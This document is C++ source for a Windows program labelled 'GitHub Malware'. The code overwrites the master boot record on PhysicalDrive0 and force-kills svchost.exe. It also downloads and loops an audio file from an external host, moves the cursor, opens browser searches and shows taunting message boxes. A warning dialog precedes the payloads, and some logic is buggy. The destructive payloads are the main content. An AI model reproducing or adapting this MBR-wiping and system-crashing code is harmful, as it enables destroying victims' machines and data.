#include <iostream>
#include <urlmon.h>
#include <Windows.h>
#include <shellapi.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
using namespace std;

LPDWORD ExitCode;
bool terminated = false;
int played = false;
DWORD WINAPI MainThread(LPVOID lparam);

BOOL WINAPI Ctrlhandler(DWORD fdwCtrlType) {
	terminated = true;
	CreateThread(NULL, NULL, &MainThread, NULL, NULL, NULL);
	return 0;
}

class Payloads {
public:
	void ClearMBR() {
		char m[512] = "ehehhehe";
		DWORD Bytes;
		HANDLE FirstSector = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ || GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(FirstSector, &m, strlen(m), &Bytes, NULL);
	}

	void OpenBrowser(int index) {
		LPCWSTR array_[] = { L"start", L"https://www.google.com/search?q=how+to+sell+heroine+and+dont+get+caught", L"https://www.google.com/search?q=minecraft+mods+cracked", L"https://www.google.com/search?q=justinbieberfreedownloadsongs2021", L"https://www.google.com/search?q=fortnite+cheats+no+virus", L"https://thepiratebay.org"};
		ShellExecute(GetActiveWindow(), L"start", array_[index], NULL, NULL, NULL);
		Sleep(10000);
	}
};

DWORD WINAPI RandomStuff(LPVOID lparam) {
	int index = 0;
	Payloads p;
	switch (played) {
	case false: {
		//Fix Download
		HRESULT check = URLDownloadToFileA(NULL, "https://cdn-118.anonfiles.com/xdA8E149u9/7f999be1-1625498742/loud%20indian%20music.wav", "KJSDIFUSHGUESHG.wav", 0, NULL);
		PlaySound(L"KJSDIFUSHGUESHG.wav", NULL, SND_LOOP);
		played = true;
	}
	}
		while (terminated == false) {
				POINT pCursor;
				GetCursorPos(&pCursor);
				SetCursorPos(pCursor.x + 10, pCursor.y + 15);
				if (index == 0) {
					p.OpenBrowser(0);
					index++;
				}
				else if (index == 5) {
					CreateThread(NULL, NULL, &RandomStuff, NULL, NULL, NULL);
					break;
				}
			Sleep(250);
		}
		terminated = true;
		CreateThread(NULL, NULL, &MainThread, NULL, NULL, NULL);
		return 0;
}

DWORD WINAPI MainThread(LPVOID lparam) {
	switch (terminated) {
	case false: {
		MessageBoxA(NULL, "Your PC has officially been infected by GitHub Malware. Good luck recovering it, nerd!", "Github Malware", MB_ICONERROR);
	}
	case true: {
		for (int i = 30; i <= 30; i++) {
			MessageBoxA(NULL, "Good luck on finding your VM Snapshot, hahaha!", "Github Malware", MB_ICONERROR);
		}
		Payloads p;
		p.ClearMBR();
		system("taskkill.exe /f /im svchost.exe");
	}
	}
	return 0;
}


int main()
{	
   char c;
   int confirmation1 = MessageBoxA(NULL, "WANRING! This Open-Source prject is Malware! It will completely destroy your computer. Are you sure you want to execute it?", "ALERT PLEASE READ", MB_YESNO);
   switch(confirmation1){
   case 6: {
	   SetConsoleCtrlHandler(&Ctrlhandler, TRUE);
	   }
   case 7: {
	   MessageBoxA(NULL, "Exitting..", "Goodbye!", MB_OK);
	   Sleep(2000);
	   exit(0);
   }
}
   return 0;
}
